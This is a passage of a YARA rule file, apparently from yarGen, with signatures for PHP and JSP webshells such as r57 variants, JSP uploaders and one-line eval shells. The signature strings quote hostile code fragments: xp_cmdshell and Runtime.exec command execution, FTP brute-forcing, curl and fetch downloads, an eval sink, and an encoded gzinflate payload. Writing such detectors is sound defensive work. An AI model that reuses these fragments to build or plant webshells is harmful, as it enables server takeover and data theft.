      $x1 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $x2 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $x3 = "'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii
      $x4 = "  if(@ftp_login($connection,$user,$user)) { echo \"[+] $user:$user - success\\r\\n\"; $suc++; }" fullword ascii
      $s5 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii
      $s6 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s7 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s8 = "'eng_text1' =>'Executed command'," fullword ascii
      $s9 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s10 = "'eng_text2' =>'Execute command on server'," fullword ascii
      $s11 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $s12 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s13 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s14 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii
      $s15 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii
      $s17 = "  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii
      $s18 = "     $sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s19 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_but" ascii
      $s20 = "echo sr(15,\"<b>\".$lang[$language.'_text88'].$arrow.\"</b>\",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule r57_kartal {
   meta:
      description = "webshell - file r57_kartal.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
   strings:
      $s1 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s2 = "'eng_text1' =>'Executed command'," fullword ascii
      $s3 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s4 = "'eng_text2' =>'Execute command on server'," fullword ascii
      $s5 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $s6 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii
      $s7 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s8 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s9 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii
      $s10 = "     $sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s11 = " else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s12 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s13 = "echo sr(45,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_n" ascii
      $s14 = "$head = '<!-- &#1047;&#1076;&#1088;&#1072;&#1074;&#1089;&#1090;&#1074;&#1091;&#1081;  &#1042;&#1072;&#1089;&#1103; -->" fullword ascii
      $s15 = " $_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s16 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii
      $s17 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s18 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii
      $s19 = "($_POST['test4_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test4_port',15,(!empty" ascii
      $s20 = "?($_POST['test3_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test3_port',15,(!empt" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule webshell_php_r57 {
   meta:
      description = "webshell - file r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $x1 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $x2 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $x3 = "'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii
      $x4 = "  if(@ftp_login($connection,$user,$user)) { echo \"[+] $user:$user - success\\r\\n\"; $suc++; }" fullword ascii
      $s5 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii
      $s6 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s7 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s8 = "'eng_text1' =>'Executed command'," fullword ascii
      $s9 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s10 = "'eng_text2' =>'Execute command on server'," fullword ascii
      $s11 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $s12 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s13 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s14 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii
      $s15 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii
      $s17 = "  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii
      $s18 = "     $sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s19 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_but" ascii
      $s20 = "echo sr(15,\"<b>\".$lang[$language.'_text88'].$arrow.\"</b>\",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_r57_iFX {
   meta:
      description = "webshell - file r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s3 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $s4 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii
      $s5 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s6 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s7 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii
      $s8 = "     $sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s9 = "<title>:: The r57 shell with modified by iFX :: listening L\\'Arc~en~Ciel - MilkyWay::</title>" fullword ascii
      $s10 = " else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s11 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s12 = "echo sr(45,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_n" ascii
      $s13 = "$head = '<!-- ??????????  ???? -->" fullword ascii
      $s14 = " $_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s15 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii
      $s16 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s17 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii
      $s18 = "($_POST['test4_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test4_port',15,(!empty" ascii
      $s19 = "?($_POST['test3_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test3_port',15,(!empt" ascii
      $s20 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule bypass_with_base32 {
   meta:
      description = "webshell - file bypass-with-base32.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d17682c9e5adee86e3a582bc0aa87eec47178119393b0757990fc12b6f678209"
   strings:
      $s1 = "            if(md5($_GET[\"pass\"])==\"df24bfd1325f82ba5fd3d3be2450096e\"){" fullword ascii
      $s2 = "            $v &= ((1 << $vbits) - 1);" fullword ascii
      $s3 = "        $v <<= (5 - $vbits);" fullword ascii
      $s4 = "            $v += (ord($input[$i]) - 97);" fullword ascii
      $s5 = "function base32_decode($input) {" fullword ascii
      $s6 = "function base32_encode($input) {" fullword ascii
      $s7 = "new ZQIH();" fullword ascii
      $s8 = "            $vbits -= 5;" fullword ascii
      $s9 = "            $vbits -= 8;" fullword ascii
      $s10 = "df24bfd1325f82ba5fd3d3be2450096e" ascii
      $s11 = "            $v += (24 + $input[$i]);" fullword ascii
      $s12 = "        public $b = null;" fullword ascii
      $s13 = "        if ($input[$i] >= 'a' && $input[$i] <= 'z') {" fullword ascii
      $s14 = "        } elseif ($input[$i] >= '2' && $input[$i] <= '7') {" fullword ascii
      $s15 = "        public $c = null;" fullword ascii
      $s16 = "        public $a = null;" fullword ascii
      $s17 = "df24bfd1325f82ba5fd3d3be245" ascii
      $s18 = "        $this->LGZOJH = @base32_decode($this->a);" fullword ascii
      $s19 = "class ZQIH{" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule minupload {
   meta:
      description = "webshell - file minupload.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "95f159db9ba6cbe6219d80ce17e7360e5906094333cc595190d683a45d9911f6"
   strings:
      $s1 = ":</font><input type=\"text\" size=\"70\" name=\"path\" value=\"<%out.print(getServletContext().getRealPath(\"/\")+\"\\k8cmd.jsp" ascii
      $s2 = "                out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+requ" ascii
      $s3 = "                out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+requ" ascii
      $s4 = "        <form name=\"frmUpload\" method=\"post\" action=\"\">   " fullword ascii
      $s5 = "    <%@page import=\"java.io.*,java.util.*,java.net.*\"%>   " fullword ascii
      $s6 = ":</font><%out.print(request.getRealPath(request.getServletPath())); %>   " fullword ascii
      $s7 = "       if(request.getParameter(\"context\")!=null)   " fullword ascii
      $s8 = "      <head>   " fullword ascii
      $s9 = "       String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"utf-8\");   " fullword ascii
      $s10 = "      </head>   " fullword ascii
      $s11 = "tRequestURI()+\"'><font color='red' title='" fullword ascii
      $s12 = "       String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"utf-8\");   " fullword ascii
      $s13 = "    <%@page contentType=\"text/html;charset=utf-8\"%>   " fullword ascii
      $s14 = "                pt.write(context.getBytes());   " fullword ascii
      $s15 = "        <title>JspDo Code By Xiao.3</title>   " fullword ascii
      $s16 = "        <input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 6KB and
      8 of them
}

rule sig_2020_08_20_18 {
   meta:
      description = "webshell - file 2020.08.20.18.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "45b5cd5f7f9af5b81db722bbc98b1a73e1cc8309229cf16cea8bf3a64a7c2e5c"
   strings:
      $s1 = "    $a($_POST['x']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_03 {
   meta:
      description = "webshell - file 2020.08.20.03.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "63e7fc4f29a407de044ab131db4e565f44d669c9cbc46ac6c945c861317261bb"
   strings:
      $s1 = "    $a($_POST['x']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_01 {
   meta:
      description = "webshell - file 2020.08.20.01.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9cc90ba195523d0e37199885470c99ef9247f8b1ab24ca53be44873cbba08f63"
   strings:
      $s1 = "    $a($_POST['x']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_04 {
   meta:
      description = "webshell - file 2020.08.20.04.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3497fc7a9af9e521106682b815b5cc7aeabaee963d13d392f94161b229631989"
   strings:
      $s1 = "    $a($_POST['x']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_02 {
   meta:
      description = "webshell - file 2020.08.20.02.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a6596594d0a152fb1303f96ce8c64215a7537270edaf8ec9e3f34cdc498519b7"
   strings:
      $s1 = "    $a($_POST['x']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule r57_1_4_0 {
   meta:
      description = "webshell - file r57.1.4.0.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ce7e1e6b461da1dda603a36cebac7fd3083abb50497bfc3f23409a21bd01ac22"
   strings:
      $x1 = "eval(gzinflate(base64_decode('FJ3FkuPKFkU/53WEBmIaipktnLwQW8z49dc1rbbLqsw8e69l6vJM+3/124xVn+7lvyzdSgL7f1HmU1H++5+qonJ2mIzY+WByr3" ascii
      $s2 = "r7IqMZuewLogN4+F3UsRtAMjHoRR8uHzTb6+LNvwXJdzIwhfxngM2HVf+WstsosAwLirnBl5uvyDJC9RXdZ8V/N9ued61MhVhwpRYApAutmTTKeY8rZl6cXw3XVpbGvW" ascii
      $s3 = "o98QdGETQ5Fe4NEOhMfXp/qM74YghuN8fdalZuTcGAo4EGVC3JpieNw+38dkXZvYitfd02gHoaTGgwo2jFmT+MqESaln4Qi/lVvY3qj0FN9chZFP3mmbZ9bZG3j1FNCK" ascii
      $s4 = "o0EHSAOafTPMnZ7qT9WDJx3V+PxaxjH8OztAY+TuLMwaZH6yUEBtyRHQyoayhMACfQ6diLJEGHV01oeVZ3L9wtJz+y10ECrmhgjVHJ0Z1Ipz/hM0/sLa5MrZflUlQsgU" ascii
      $s5 = "FUbiLTs2iR8J+CN21p/aqmHAdllphiYgMcTVvqlZrHx+AI19jfn2ybP3peW+im8o8bc0yzvrI/+YeemU6zFAoJdDuuzduK1s3wFWmLvVwmfzkG5EYjZkxQMDf2HThah9" ascii
      $s6 = "NMF6fUwm4JFKmEx3NVwc6O+MgnC9QvERPwHOZ4ohtOQ97sPuVEnUceDWvBbUBW8et+/a67Gw7zO4s1Zngnoi/IkXVnWgIYVbirCF6yn1t7hleIjtrkY6QrEd9mmZxLT6" ascii
      $s7 = "ckigngsKTn9Mh9m81n+logEQCoflMrt6k2OAjhZ1md56QwoNNf+byHRfpiCoYE53v+St1Zl95i85iBDEA6aPz2cnwSf4uEm6Fhm9FSVXeO6qqYOG8MtykmhJN3HLRxhr" ascii
      $s8 = "rP0CGbbJbijLYqYNL4jAwU+5sR9FbVI0+b69TcprOnDJI7cxn89Sl0713VsXtjqeg+G6VEcCDpOqUvJIdqfhXgGR1Wfz/Bt+OyOFoPUPhVjuIfccd7Km9UQZNeQdxi6x" ascii
      $s9 = "diis8mlrrobG/HyCLsCm/vpan+sg5mg8o6S/dr7DhMKJJqYK/v8ZA8+LM4nsJHiRQRqpgeTfMl6zs8l1xGioSgJXKt0GbNoqJ0D3JKrqOmkqkxrJ0kuszn+mo8RmWLjh" ascii
      $s10 = "V/+3SfuCSxahqITU1LqJZFvzIHUNJRlOgZb40E6NyExEKrtetI1Cgwr92MFaHotQ4b8ENcKmNC4XsoVq9dG8Omdwp5oLN5dXOt9P4W8K2erFntdYxi6ZlBFW2EEg+s8w" ascii
      $s11 = "wKq4AHrIp2aAu6WdJhD2a6UnjTP0czclHRPVWAGpYnnKvO9Gq4SirpRLa1V4vF/MoYyt/hinvyd4HMDrTpKU65FCfymanUtIaai7EZmpQUQImu0JiyVYPSeojvCzeHJk" ascii
      $s12 = "OPCqq0C10Mju7lWSzShvPk4/ujhUfMSHIrtQjnz2fS27NXOY1EiZYMUf/IDdu4h5QpMDOBmkdlGA2aa9ospZ72ab1OsB4PifOV+Xh3/QeeEYevJ6nahrPtCrcpEXP/fA" ascii
      $s13 = "VDD97TFBLfWyE3T6FmnDpGVfUJpoj461KSfTpr96GBZaauqrWzkysA3xIBimg/enuwcsQ+eYHicWbxecdSB+xo8lMs3V6z5AUgEDB6qbowIRSTc99Qz2Ct3ytESQXEFV" ascii
      $s14 = "mxVH8h0Ygo0LhzgLBj5fnFrc5ZYbS1jNyzO87FZhsQAiTuJKMpqIKmb3LjV6EP1hIfwFPSAMD/+hNRN0EYp0gLW4Au0M/SLVG6JnOG5r5GvBjoKIBCY0z0A5MNmdeaPb" ascii
      $s15 = "ggVqdxdmS72hezJZS66of4SvMeBbv+t03MkBNWcpEfU0QKoiD2h+ncJHKptbJUfZMBRfYRf5RV8WlaCCydJ6zwjJ9MTa9lWB8Mazs5waSYe4l7phrEcyC9Ecl5nEGA7K" ascii
      $s16 = "tGwEzdIvggESFtuX9GsyB+whA51Uw+P0UHzv4FvXMe1vU86EsowmBQEVJZwsNZyvsxUF+3g7zJM3AHUUsmArP7/shYHZMRnSKsqmS18n1RXKlhrU7BliMzyn+nsZ1y89" ascii
      $s17 = "/I7SCDDoGp1SVZ96gh0gdOTi+FfV2JSul3vpbRuoFPRUucw0z5J6jwxpK9ioMooKulnG1Z5mDUkJShitAQ4QggIyJmcS/kKKAKHHlMs33KL/AuKmFXCqAhA4lelFG7ul" ascii
      $s18 = "ND8VOXUDIfwrAPKK8wBfbzGC++X1mxO8SNBpUCFAHghCpLpJKTqC1ss/i+NhADXhXm7GtnYREDY3VHczY4Lco9CXhlpG/3SyBfiHaiZums50RNT4lPb1Qrhh6sqZUZTC" ascii
      $s19 = "Sfs+TaDd9LE8iK9teuD/E9aiUgyZr9AIV7GTmSNN9eccq/++XAtl1nH7LCMdefij03/qAEVjd+MF54BgUypNeA7FbYPTi07E0iPxhbxtdOnEkCpIMo8n6NAwkXpYmw4b" ascii
      $s20 = "2UrBMFI/qS1/djrdPt5PHnVEP296P0qzkj8PYTzLzYNMkAjKl94JQOPpO0VvmZbRTCB4tMPAXEq+Y4ohSqZQa2iA7XgkF+kF+H9sfu+HUqVlQfL/WSbfRQ6NwM0oWXJm" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_404 {
   meta:
      description = "webshell - file 404.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
   strings:
      $x1 = "  Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = " Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>\"};" fullword ascii
      $s4 = "  /** Convenience method to read HTTP header lines */" fullword ascii
      $s5 = "  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir," fullword ascii
      $s6 = "<br>Any question, please email me hackgooddog@gmail.com" fullword ascii
      $s7 = " String bound = request.getContentType().substring(bstart + 8);" fullword ascii
      $s8 = "\",\"Execute\"};" fullword ascii
      $s9 = "  sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsoluteP" ascii
      $s10 = "<center><a href=\"http://www.gooddog.in\" target=\"_blank\">www.gooddog.in</a> ,All Rights Reserved." fullword ascii
      $s11 = "<a href=\"http://gooddog.in/\" target=\"_blank\">http://gooddog.in/</a></b>" fullword ascii
      $s12 = " <b>\"+strDir+\"</b></td><td>\" + getDrivers() + \"</td></tr></table><br>\\r\\n\");" fullword ascii
      $s13 = "  sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsoluteP" ascii
      $s14 = "  private final String lineSeparator = System.getProperty(\"line.separator\", \"\\n\");" fullword ascii
      $s15 = "        line = getLine(is); // Skip \"Content-Type:\" line" fullword ascii
      $s16 = "      line = getLine(is); // Skip \"Content-Type:\" line" fullword ascii
      $s17 = "  response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
      $s18 = " return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword ascii
      $s19 = "  FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword ascii
      $s20 = " int bstart = request.getContentType().lastIndexOf(\"oundary=\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_data02 {
   meta:
      description = "webshell - file data02.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
   strings:
      $x1 = "  Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = " Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>\"};" fullword ascii
      $s4 = "????<a href=\"http://bbs.syue.com/\" target=\"_blank\">http://bbs.syue.com/</a></b>" fullword ascii
      $s5 = "out.println(\"<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolord" ascii
      $s6 = "  /** Convenience method to read HTTP header lines */" fullword ascii
      $s7 = "  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir," fullword ascii
      $s8 = "<center><a href=\"http://www.wooyun.org/\" target=\"_blank\">http://www.WooYun.org/</a> ,All Rights Reserved." fullword ascii
      $s9 = " String bound = request.getContentType().substring(bstart + 8);" fullword ascii
      $s10 = "  sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsoluteP" ascii
      $s11 = "<br>Email:121208099#qq.com" fullword ascii
      $s12 = "rk=#FFFFFF><tr><td width='30%'>\"+strCurrentFolder[languageNo]+\"?? <b>\"+strDir+\"</b></td><td>\" + getDrivers() + \"</td></tr>" ascii
      $s13 = "  sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsoluteP" ascii
      $s14 = "  private final String lineSeparator = System.getProperty(\"line.separator\", \"\\n\");" fullword ascii
      $s15 = "        line = getLine(is); // Skip \"Content-Type:\" line" fullword ascii
      $s16 = "      line = getLine(is); // Skip \"Content-Type:\" line" fullword ascii
      $s17 = "  response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
      $s18 = " return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword ascii
      $s19 = "  FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword ascii
      $s20 = " int bstart = request.getContentType().lastIndexOf(\"oundary=\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_ma2 {
   meta:
      description = "webshell - file ma2.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "09b677ca8806f681cb31ad69b8ec79b3416b491a04b8283d606ac7ba7edffeda"
   strings:
      $s1 = "    Hashtable ht = parser.processData(request.getInputStream(), \"-\", tempdir);" fullword ascii
      $s2 = "  response.setHeader (\"Content-Disposition\", \"attachment;filename=\\\"bagheera.zip\\\"\");" fullword ascii
      $s3 = " v1.001 By Bagheera<a href=\"http://jmmm.com\">http://jmmm.com</a>" fullword ascii
      $s4 = "    public Hashtable processData(ServletInputStream is, String boundary, String saveInDir)" fullword ascii
      $s5 = "\"Content-Type:\"" fullword ascii
      $s6 = "*E-mail:bagheera@beareyes.com                                                        *" fullword ascii
      $s7 = "request.setAttribute(\"dir\", request.getParameter(\"dir\"));" fullword ascii
      $s8 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=gb2312\">" fullword ascii
      $s9 = "**http://jmmm.com/web/index.jsp    " fullword ascii
      $s10 = "*http://jmmm.com                                                                     *" fullword ascii
      $s11 = "private static String tempdir = \".\";" fullword ascii
      $s12 = "  * @version 1.001" fullword ascii
      $s13 = "  * @author bagheera" fullword ascii
      $s14 = " if(document.all && !OP) {" fullword ascii
